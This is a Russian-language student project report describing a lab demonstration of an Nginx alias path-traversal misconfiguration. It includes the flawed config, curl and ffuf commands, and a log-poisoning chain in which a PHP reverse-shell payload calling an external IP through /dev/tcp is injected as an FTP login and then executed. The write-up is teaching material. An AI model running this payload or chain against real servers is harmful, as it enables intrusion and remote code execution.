###<p align=center> ОАНО ДПО "ВЫШТЕХ"</p>

<br>
<br>
<br>
<br>
<br>
<br>
<br>





###<p align=center>                                       Пояснительная записка к проекту </p> 
##<p align=center>                          Демонстрация уязвимости path traversal на сервере Nginx </p> 

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<p align=right>Выполнил: Плясовских Д. В.</p>

<p align=right>Проверил: Кондратьев А.</p>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<p align=center> г. Москва <br>
2022</p>
<br>
<br>
<br>
<br>
<br>
<br>

###<p align=center> 1. Что такое  path traversal?

Уязвимость, которая появляется при неправильной конфигурации алиасов.
Nginx alias — это некий псевдоним, который может скрыть настоящее местоположение объекта. Он определяется
в директиве `location`. В нашем случае конфигурация установит замену `/cat/ на /base/catalog/`

```yaml 
server {
  listen 80;
  location /cat/ {   

   	alias /var/www/mywebsite/base/catalog/; 
    	access_log off;

  }
}
```

Во время обращения к `/cat/test.png` веб-сервер вернет файл `/base/catalog/test.png`
Уязвимость проявляется при неправильном указании `location`, как в этом конфиге:

```yaml 
server {
  listen 80;
  location /cat {   

    alias /base/catalog/;
    access_log off;

  }
}
```
В данном случае, если обратиться к `/cat../test.png`, сервер вместо того, чтобы вернуть файл `/base/catalog/test.png`,
выполнит прямую замену алиаса и попытается вернуть `/base/test.png`, тем самым обходя директорию  `catalog`.


###<p align=center>2. Структура стенда.

Стенд собран на ВМ VirtualBox и содержит 3 nginx-сервера: <br> 
Nginx-1 — балансировщик нагрузки, работающий в режиме round-robin, который отправляет запросы по очереди на сервера
nginx-2 и  nginx-3. <br>
nginx-2 и  nginx-3 — одинаковые сервера, на которых располагается содержимое сайта. Между собой они отличаются лишь
одним знаком в конфигурационном файле сервера.

###<p align=center>3. Демонстрация.

Сделаем запрос `curl 127.0.0.1:8081/cat/image.html` дважды.
Мы видим, что ответ сервера одинаков, за исключением того, что указывается с какого именно сервера пришел 
ответ - nginx-2 или  nginx-3.

Изменим наш запрос на `curl 127.0.0.1:8081/cat../flag.html`
Сейчас на запрос приходит разный ответ, от разных серверов. Nginx-2 — ошибка 404 (не найдена страница) и ее
действительно не существует по этому пути, а  nginx-3 возвращает страницу с флагом. Этот же результат (получение флага),
но для обоих серверов можно получить, если мы знаем путь, который скрыт за алиасом — `/base/flag.html`
Проверим это, введя запрос `curl 127.0.0.1:8081/base/flag.html`
Таким образом, используя путь `/cat../` мы обходим директорию `catalog` попадая сразу в директорию `base`, которая
находится на уровень выше.

###<p align=center>4. Эксплуатация уязвимости.

Выходит, если мы знаем путь до флага, а в реальности - до какого либо важного объекта тестируемой системы, то мы можем
без особых усилий попасть в эту директорию. При условии, что в конфигурации допущена уязвимость path traversal.
Здесь перед атакующим встают два вопроса — как найти эту уязвимость и как с помощью найденной уязвимости, найти
важные файлы не зная структуры сайта.<br>
Но обо всем по порядку. Для начала, выключим  nginx-2 и оставим только одну машину с уязвимостью.
Первым делом просканируем порты. Это стандартная процедура при любом пентесте.
Один из популярных сканеров портов — nmap. Давайте просканируем порты выполнив 
```bash
nmap 127.0.0.1
```
В результате мы видим что используются в том числе порты 8081 (web) и 2103 (ftp).
В реальном мире это должны быть 80 и 21 порты. Это определяет плоскость атаки на сервер.
И да, если сталкиваетесь с nginx, то первым делом надо искать уязвимость обхода путей.
Для этого, мы сканируем адрес `/cat../ `методом пербора типовых директорий, используемых в сайтостроении. Используем
сканнер FFUF с подключением необходимых словарей. Здесь вместо FUZZ подключается путь из используемого словаря.
```bash
./ffuf -u http://127.0.0.1:8081/cat../FUZZ -w /somyourpath/SecLists/Fuzzing/sec-path.txt -t 2
```

Надо отметить, что пентестинг вещь непредсказуемая, в том смысле, что развитие атаки зависит от того что мы найдем  при
каждом сканировании и знаем ли мы как использовать то, что мы нашли. Один из сценариев использования этой уязвимости
следующий:

1. Найден файл vsftpd.log куда можно сделать запись о попытке подключения по ftp
2. Найдены страницы сайта с php которые используют в качестве параметра, другие файлы php. 
Например: `/base/view.php?page=user.php` (используем Burp History)
3. Делается попытка подключения по ftp, в качестве логина используем
```bash
<!--?php exec("/bin/bash -c 'bash -i > /dev/tcp/178.10.10.1/443 0>&1'"); ?-->
```
тем самым записываем этот код в файл лога  vsftpd.log
4. На атакующей машине запускается программа-слушатель (например netcat), которая примет соединение от машины жертвы,
после того как код из предыдущего пункта будет запущен.
5. Выполняем запрос `curl 127.0.0.1:8081/cat../view.php?page=../log/vsftpd.log` где из файла лога считывается
и исполняется наш код. <br>
Все, RCE реализовано.



###<p align=center>5. Заключение.
Как можно было увидеть, отсутствие всего лишь одного знака,  может привести к взлому. Метод борьбы с этой уязвимостью
достаточно прост — обязательное использование линтера в работе специалиста по безопасности. Поскольку  от человеческого
фактора не защитит никто.

###<p align=center>6. Источники.

1. https://github.com/bykvaadm/OS/tree/master/devops/ansible/lab7 — прообраз стенда.
2. https://spy-soft.net/hack-nginx/ - оригинальный текст с разбором уязвимости.